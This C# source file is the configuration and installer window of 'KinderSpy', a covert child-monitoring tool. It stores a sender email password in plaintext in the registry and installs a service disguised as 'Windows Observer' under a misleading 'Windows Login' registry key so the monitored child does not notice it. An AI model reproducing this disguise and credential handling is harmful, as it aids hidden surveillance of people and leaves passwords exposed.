using Microsoft.Win32;
using System;
using System.Windows;

namespace KinderSpy
{
    public partial class MainWindow : Window
    {
        RegistryKey Key;
        string password;
        string curFolder;
        string serviceName = "Windows Observer";
        string servicePath = "Windows Observer";

        public MainWindow()
        {
            InitializeComponent();
        }

        private void windowLoaded(object sender, RoutedEventArgs e)
        {
            Key = Registry.CurrentUser.CreateSubKey($"SOFTWARE\\Windows Login\\Services data");

            tbParentMail.Text = Key.GetValue("Arg0", string.Empty).ToString();
            tbSecondMail.Text = Key.GetValue("Arg1", string.Empty).ToString();
            tbSeconMailPass.Text = Key.GetValue("Arg2", string.Empty).ToString();
            tbKidName.Text = Key.GetValue("Arg3", string.Empty).ToString();
            tbCount.Text = Key.GetValue("Arg4", string.Empty).ToString();
            tbPeriod.Text = Key.GetValue("Arg5", string.Empty).ToString();

            password = Key.GetValue("Arg99", string.Empty).ToString();
            curFolder = Key.GetValue("Arg98", string.Empty).ToString();
            tbPassword.Text = password;

            gridPassword.Visibility = string.IsNullOrWhiteSpace(password) ? Visibility.Collapsed : Visibility.Visible;
        }
        private void btnSaveClick(object sender, RoutedEventArgs e)
        {
            bool ca = true;

            if (string.IsNullOrWhiteSpace(tbKidName.Text))
            {
                MessageBox.Show("Kid's name can not be empty!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                ca = false;
            }
            if (string.IsNullOrWhiteSpace(tbPeriod.Text))
            {
                MessageBox.Show("Specify period!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                ca = false;
            }
            if (string.IsNullOrWhiteSpace(tbCount.Text))
            {
                MessageBox.Show("Specify count of reports for create general report!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                ca = false;
            }
            if (string.IsNullOrWhiteSpace(tbParentMail.Text))
            {
                MessageBox.Show("Enter the EMail where will be send reports!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                ca = false;
            }
            if (string.IsNullOrWhiteSpace(tbSecondMail.Text))
            {
                MessageBox.Show("Enter the EMail from will be send reports!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                ca = false;
            }
            if (string.IsNullOrWhiteSpace(tbSeconMailPass.Text))
            {
                MessageBox.Show("Enter the password of EMail from will be send reports!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                ca = false;
            }
            if (string.IsNullOrWhiteSpace(tbPassword.Text))
            {
                MessageBox.Show("If you are not set a password for application your kid can take access to this spy-tool and remove them! Be careful!", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
            }

            if (ca)
            {
                Key.SetValue("Arg0", tbParentMail.Text);
                Key.SetValue("Arg1", tbSecondMail.Text);
                Key.SetValue("Arg2", tbSeconMailPass.Text);
                Key.SetValue("Arg3", tbKidName.Text);
                Key.SetValue("Arg4", tbCount.Text);
                Key.SetValue("Arg5", tbPeriod.Text);

                Key.SetValue("Arg98", Environment.CurrentDirectory);
                Key.SetValue("Arg99", tbPassword.Text);

                MessageBox.Show("Settings was saved!", "Information", MessageBoxButton.OK, MessageBoxImage.Information);
            }
        }
        private void btnEnterClick(object sender, RoutedEventArgs e)
        {
            if (pbPassword.Password == password)
                gridPassword.Visibility = Visibility.Collapsed;
            else
                Environment.Exit(1);
        }
        private void btnRemoveClick(object sender, RoutedEventArgs e)
        {
            if (ServiceManager.ServiceIsInstalled(serviceName))
            {
                try { ServiceManager.StopService(serviceName); }
                catch { }

                ServiceManager.Uninstall(serviceName);
            }
            else
                MessageBox.Show("Service is not installed!", "Warning!", MessageBoxButton.OK, MessageBoxImage.Warning);
        }
        private void btnSetupClic(object sender, RoutedEventArgs e)
        {
            if (ServiceManager.ServiceIsInstalled(serviceName))
                ServiceManager.StartService(serviceName);
            else
                ServiceManager.InstallAndStart(serviceName, serviceName, servicePath);

            MessageBox.Show("Service was installed!", "Information!", MessageBoxButton.OK, MessageBoxImage.Information);
        }
    }
}
